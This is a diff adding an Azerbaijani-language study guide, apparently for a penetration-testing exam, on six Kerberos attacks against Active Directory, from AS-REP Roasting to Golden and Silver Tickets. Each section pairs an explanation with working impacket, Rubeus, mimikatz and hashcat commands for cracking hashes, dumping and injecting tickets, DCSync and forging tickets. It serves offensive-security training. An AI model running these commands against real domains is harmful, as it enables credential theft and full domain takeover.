@@ -1,0 +1,376 @@
+Hər hücumu sıfırdan, dərindən izah edirəm — mexanizm + niyə işləyir + komandalar.
+
+---
+
+## 1. AS-REP Roasting
+
+### Mexanizm — nə baş verir?
+
+Normal Kerberos-da Addım 1-də client KDC-yə timestamp göndərir — bu **pre-authentication**-dır. KDC yoxlayır ki, bu adam həqiqətən parolunu bilir.
+
+Bəzi accountlarda `DONT_REQ_PREAUTH` flaqı aktiv olur. Bu halda KDC heç bir yoxlama etmədən **AS-REP cavabı** göndərir. Bu cavabın içində istifadəçinin **hash-i ilə şifrələnmiş** Session Key var.
+
+```
+Normal:    Client → {timestamp şifr. öz hash-i ilə} → KDC yoxlayır → TGT verir
+AS-REP:    Client → "salam, mən johnəm" → KDC heç yoxlamır → AS-REP göndərir
+                                                    ↑
+                                        Bu cavabın içi john-un hash-i ilə şifr.
+```
+
+Sən bu şifrəli bloku götürüb **offline** crack edirsən. KDC-yə bir daha toxunmursan.
+
+### Şərt nədir?
+`DONT_REQ_PREAUTH` = True olan account lazımdır. Bu bəzən sysadmin səhvi ilə aktiv qalır (köhnə SAP, Oracle klientlər bunu tələb edirdi).
+
+### Hash formatı
+`$krb5asrep$23$user@domain:...` — hashcat mode **18200**
+
+```bash
+# Cred olmadan — sadəcə username listəsi kifayətdir
+GetNPUsers.py exam.htb/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
+
+# Cred varsa — daha sürətli, avtomatik tapır
+GetNPUsers.py exam.htb/mark:'P@ss123' -request -format hashcat -outputfile asrep.txt
+
+# BloodHound ilə tapmaq
+# "Find AS-REP Roastable Users" → hazır sorğu var
+
+# Crack
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
+john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
+```
+
+### Niyə təhlükəlidir?
+Heç bir cred olmadan hətta domainə qoşulmadan edilə bilər. Sadəcə DC-nin 88 portuna çatmaq kifayətdir.
+
+---
+
+## 2. Kerberoasting
+
+### Mexanizm — nə baş verir?
+
+Kerberos-da **istənilən** autentifikasiya olmuş domain istifadəçisi, **istənilən** SPN üçün Service Ticket istəyə bilər. Bu dizayn qərardır — brute force deyil, legitim sorğudur.
+
+Problem: Service Ticket **servis account-un NTLM hash-i ilə** şifrələnir. Bu hash-i offline crack edə bilərsən.
+
+```
+Sen (domain user) → KDC: "mənə MSSQL/srv01 üçün bilet ver"
+KDC → Service Ticket (svc_mssql-ın NTLM hash-i ilə şifr.) qaytarır
+Sen → bu bileti götürüb offline crack edirsən
+Əgər svc_mssql-ın parolu zəifdirsə → crack olur → hesaba giriş
+```
+
+KDC bu sorğunu **normal** görür. Heç bir anomaliya yoxdur — hər domain user bunu edə bilər.
+
+### Şərt nədir?
+- Domain user credentialı lazımdır (istənilən adi user)
+- Hədəf account-un SPN-i olmalıdır (`servicePrincipalName` atributu dolu)
+- Hədəf account-un parolu zəif olmalıdır
+
+### Hash formatı
+`$krb5tgs$23$*user*$domain$SPN*...` — hashcat mode **13100**
+
+```bash
+# Bütün kerberoastable accountları tap və hash al
+GetUserSPNs.py exam.htb/mark:'P@ss123' -dc-ip 10.10.X.X -outputfile kerberoast.txt
+
+# Sadəcə listələ (hash almadan)
+GetUserSPNs.py exam.htb/mark:'P@ss123' -dc-ip 10.10.X.X
+
+# Windows daxilindən (Rubeus)
+Rubeus.exe kerberoast /outfile:hashes.txt
+Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt  # yalnız RC4 (crack asandır)
+
+# PowerView ilə SPN-li userləri tap
+Get-DomainUser -SPN | select samaccountname,serviceprincipalname
+
+# Crack
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force -r /usr/share/hashcat/rules/best64.rule
+```
+
+### AS-REP Roasting ilə fərqi
+
+| | AS-REP Roasting | Kerberoasting |
+|---|---|---|
+| Cred lazımdır? | Xeyr | Bəli (adi user) |
+| Hədəf | Pre-auth deaktiv user | SPN-li servis account |
+| Hash mənşəyi | İstifadəçi hash-i | Servis account hash-i |
+| Hashcat mode | 18200 | 13100 |
+
+---
+
+## 3. Pass-the-Ticket (PtT)
+
+### Mexanizm — nə baş verir?
+
+Kerberos biletlər (TGT və ST) RAM-da saxlanılır. Əgər bu biletləri dump edib başqa sessiyadə inject etsən — parol olmadan həmin istifadəçi kimi hərəkət edə bilərsən.
+
+```
+Normal axın:
+John login olur → TGT RAM-da saxlanır → servis istəyəndə TGT-ni göndərir
+
+PtT hücumu:
+Sən → John-un maşınına girdin → RAM-dan TGT-ni çıxardın (.kirbi fayl)
+Sən → Öz sessiyana TGT-ni inject etdin
+Sən → Artıq John kimi hərəkət edirsən — parol bilmirsən amma bilet var
+```
+
+### Windows-da (mimikatz / Rubeus)
+
+```powershell
+# Mimikatz ilə dump et
+mimikatz # sekurlsa::tickets /export
+# Disk-ə .kirbi faylları yazır
+
+# Hansı biletlər var?
+mimikatz # kerberos::list
+
+# Inject et
+mimikatz # kerberos::ptt [0;12345]-0-0-40e10000-john@krbtgt-EXAM.HTB.kirbi
+
+# Rubeus ilə dump
+Rubeus.exe dump /nowrap
+Rubeus.exe dump /user:john /nowrap
+
+# Rubeus ilə inject
+Rubeus.exe ptt /ticket:BASE64_TICKET
+
+# Yoxla
+klist   # aktiv biletlər
+dir \\dc01\C$   # giriş var?
+```
+
+### Linux-da (ccache faylları)
+
+```bash
+# Biletlər /tmp/krb5cc_XXXX formatında saxlanılır
+ls /tmp/krb5cc*
+
+# ccache faylını istifadə et
+export KRB5CCNAME=/tmp/krb5cc_1000
+
+# İndi kerberized alətlər bu bileti işlədər
+smbclient //dc01.exam.htb/C$ -k -no-pass
+secretsdump.py -k -no-pass exam.htb/john@dc01.exam.htb
+psexec.py -k -no-pass exam.htb/john@dc01.exam.htb
+
+# impacket-də bilet faylını specify et
+export KRB5CCNAME=./john.ccache
+wmiexec.py -k -no-pass exam.htb/john@dc01.exam.htb
+```
+
+### Şərt nədir?
+- Hədəf maşına giriş (local admin) lazımdır ki biletləri dump edəsən
+- Bilet hələ vaxtı keçməmiş olmalıdır (TGT 10 saat)
+
+---
+
+## 4. Overpass-the-Hash (Pass-the-Key)
+
+### Mexanizm — nə baş verir?
+
+Adını beləcə parçala: **"Over" pass-the-hash** — hash-i pass etmirsən, hash-i **Kerberos TGT-yə çevirirsən**, sonra onu pass edirsən.
+
+Klassik Pass-the-Hash NTLM protokolunu istifadə edir. Bəzi mühitlərdə NTLM bloklanıb — yalnız Kerberos icazəlidir. Bu zaman NTLM hash-in olsa belə birbaşa işlətmək olmaz. Overpass-the-Hash həlli:
+
+```
+Sən → NTLM hash-in var (mimikatz, secretsdump, SAM dump)
+     ↓
+NTLM hash-i → KDC-yə göndər → TGT al
+     ↓
+TGT-ni işlət → Kerberos authentication → servislərə giriş
+```
+
+```
+Pass-the-Hash:    NTLM_HASH → birbaşa NTLM auth (SMB, WMI)
+Overpass-the-Hash: NTLM_HASH → KDC-dən TGT al → Kerberos auth
+```
+
+### Texniki izah
+
+KDC-yə AS-REQ göndərəndə timestamp-i user-in hash-i ilə şifrələyirsən. Əgər NTLM hash-i bilirsənsə, bu şifrələməni özün edə bilərsən. KDC açır, düz gəlir, TGT verir.
+
+```bash
+# impacket ilə — NTLM hash-dən TGT al
+getTGT.py exam.htb/svc_deploy -hashes :5f4dcc3b5aa765d61d8327deb882cf99
+
+# AES hash-dən (daha stealth)
+getTGT.py exam.htb/svc_deploy -aesKey AES256_KEY_BURAYA
+
+# TGT-ni export et
+export KRB5CCNAME=svc_deploy.ccache
+
+# İndi Kerberos ilə hər şey işlər
+psexec.py -k -no-pass exam.htb/svc_deploy@dc01.exam.htb
+wmiexec.py -k -no-pass exam.htb/svc_deploy@dc01.exam.htb
+secretsdump.py -k -no-pass exam.htb/svc_deploy@dc01.exam.htb
+
+# Windows daxilindən (mimikatz)
+mimikatz # sekurlsa::pth /user:svc_deploy /domain:exam.htb /ntlm:HASH /run:cmd.exe
+# Yeni cmd açılır — o cmd Kerberos kontekstindədir
+```
+
+### Pass-the-Hash ilə fərqi
+
+| | Pass-the-Hash | Overpass-the-Hash |
+|---|---|---|
+| Protokol | NTLM | Kerberos |
+| NTLM blokludursa | İşləmir | İşləyir |
+| Lazım olan | NTLM hash | NTLM hash (və ya AES key) |
+| Nə əldə edilir | NTLM session | TGT → tam Kerberos session |
+| Noise | NTLM logları | Kerberos logları |
+
+---
+
+## 5. Golden Ticket
+
+### Mexanizm — nə baş verir?
+
+Addım 2-dən xatırlayırsan: TGT `krbtgt` account-un hash-i ilə şifrələnir. KDC TGT-ni açanda yoxlayır, içindəki məlumatları oxuyur.
+
+Əgər `krbtgt` hash-ini bilirsənsə — **özün TGT yarada bilərsən.** İçinə istədiyini yazırsan: istənilən username, istənilən qrup (Domain Admins), istənilən müddət (10 il). KDC açır, düz gəlir, qəbul edir.
+
+```
+Normal:    KDC → "mən krbtgt hash-imlə TGT yaratdım, imzaladım"
+Golden:    Sən → "mən krbtgt hash-ini oğurladım, özüm TGT yaratdım"
+KDC yoxlayır: hash-i açır → düz gəlir → qəbul edir
+KDC bilmir ki, bu TGT-ni o özü yaratmayıb
+```
+
+### Şərt nədir?
+`krbtgt` account-un NTLM hash-i + Domain SID lazımdır. Bunları DCSync ilə alırsan (DA hüququ lazımdır).
+
+### Niyə bu qədər güclüdür?
+- İstənilən user adı yazılır (hətta mövcud olmayan `hacker999`)
+- İstənilən qrupa üzv edilir (Enterprise Admins, Domain Admins)
+- 10-20 il müddəti — `krbtgt` parolu dəyişilənə qədər işləyir
+- KDC-dən asılı deyil — TGT yaradılandan sonra KDC-yə toxunmursan
+
+```bash
+# 1. krbtgt hash-ini al (DCSync)
+secretsdump.py exam.htb/Administrator:'P@ss!'@dc01.exam.htb -just-dc-user krbtgt
+# Çıxış: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:KRBTGT_HASH:::
+
+# Domain SID-i tap
+lookupsid.py exam.htb/mark:'P@ss!'@dc01.exam.htb | grep "Domain SID"
+# S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX
+
+# 2. Golden Ticket yarat (impacket)
+ticketer.py -nthash KRBTGT_HASH \
+            -domain-sid S-1-5-21-XXX-XXX-XXX \
+            -domain exam.htb \
+            Administrator
+# Administrator.ccache faylı yaranır
+
+# 3. İstifadə et
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass exam.htb/Administrator@dc01.exam.htb
+secretsdump.py -k -no-pass exam.htb/Administrator@dc01.exam.htb
+
+# Windows daxilindən (mimikatz)
+mimikatz # kerberos::golden /user:Administrator /domain:exam.htb \
+           /sid:S-1-5-21-XXX /krbtgt:KRBTGT_HASH /ptt
+# /ptt = birbaşa RAM-a inject et
+klist  # bilet var?
+dir \\dc01\C$  # giriş?
+
+# Mövcud olmayan user ilə (stealth)
+ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain exam.htb phantom_user
+```
+
+---
+
+## 6. Silver Ticket
+
+### Mexanizm — nə baş verir?
+
+Golden Ticket-də saxta TGT yaradırdın. Silver Ticket-də isə saxta **Service Ticket** yaradırsan.
+
+Addım 4-dən xatırlayırsan: Service Ticket servis account-un hash-i ilə şifrələnir, hədəf server KDC-yə soruşmadan özü açır.
+
+Əgər servis account-un hash-ini bilirsənsə — həmin servislər üçün saxta ST yarada bilərsən. Server açır, düz gəlir, qəbul edir.
+
+```
+Normal:    KDC → ST yaradır (svc_mssql hash-i ilə) → sənə verir → serverə göndərirsən
+Silver:    Sən → svc_mssql hash-ini oğurladın → özün ST yaradırsan → birbaşa serverə göndərirsən
+           KDC tamamilə bypass olunur — heç bir log qalmır DC-də
+```
+
+### Golden ilə fərqi
+
+| | Golden Ticket | Silver Ticket |
+|---|---|---|
+| Hansı hash lazımdır | `krbtgt` hash | Servis account hash-i |
+| Nə yaradırsan | Saxta TGT | Saxta Service Ticket |
+| Hansı servisə giriş | Hamısına | Yalnız həmin servisə |
+| DC-yə traffik | AS-REQ + TGS-REQ | **Heç biri — sıfır DC contact** |
+| Güc | Tam domain | Məhdud (bir servis) |
+| Stealth | Az | **Maksimum** |
+
+### Servis növləri
+
+```
+cifs/dc01.exam.htb    → SMB, fayl sistemi
+http/web.exam.htb     → Web servisləri
+mssql/sql.exam.htb    → SQL Server
+host/dc01.exam.htb    → WMI, psexec
+ldap/dc01.exam.htb    → LDAP sorğuları, DCSync!
+```
+
+```bash
+# 1. Servis account hash-ini al
+secretsdump.py exam.htb/Administrator:'P@ss!'@dc01.exam.htb -just-dc-user svc_mssql
+
+# 2. Silver Ticket yarat
+ticketer.py -nthash SVC_MSSQL_HASH \
+            -domain-sid S-1-5-21-XXX-XXX-XXX \
+            -domain exam.htb \
+            -spn MSSQL/sql.exam.htb \
+            Administrator
+# Administrator.ccache yaranır
+
+# 3. İstifadə et
+export KRB5CCNAME=Administrator.ccache
+mssqlclient.py -k -no-pass exam.htb/Administrator@sql.exam.htb
+
+# CIFS üçün Silver Ticket
+ticketer.py -nthash DC_MACHINE_HASH \
+            -domain-sid S-1-5-21-XXX \
+            -domain exam.htb \
+            -spn cifs/dc01.exam.htb \
+            Administrator
+export KRB5CCNAME=Administrator.ccache
+smbclient //dc01.exam.htb/C$ -k -no-pass
+
+# Windows daxilindən (mimikatz)
+mimikatz # kerberos::golden /user:Administrator /domain:exam.htb \
+           /sid:S-1-5-21-XXX /target:dc01.exam.htb \
+           /service:cifs /rc4:MACHINE_HASH /ptt
+```
+
+---
+
+## Bütün hücumların müqayisəsi
+
+```
+Cred/Hash yoxdur:
+└── AS-REP Roasting → crack → cred əldə et
+
+Adi domain cred-i var:
+└── Kerberoasting → servis hash → crack → servis account
+
+Maşına girsən, RAM dump:
+└── Pass-the-Ticket → birbaşa bilet al → inject et
+
+NTLM hash var, NTLM blokdur:
+└── Overpass-the-Hash → hash-dən TGT al → Kerberos sessiyası
+
+DA-san, krbtgt hash aldın:
+└── Golden Ticket → saxta TGT → istənilən user kimi → domain hakimiyyəti
+
+Servis account hash-i var:
+└── Silver Ticket → saxta ST → həmin servisə sıfır log ilə giriş
+```
+
+İmtahanda hər ehtimala hazır ol — BloodHound path göstərən kimi hansı hücum olduğunu dərhal görəcəksən. Uğurlar!
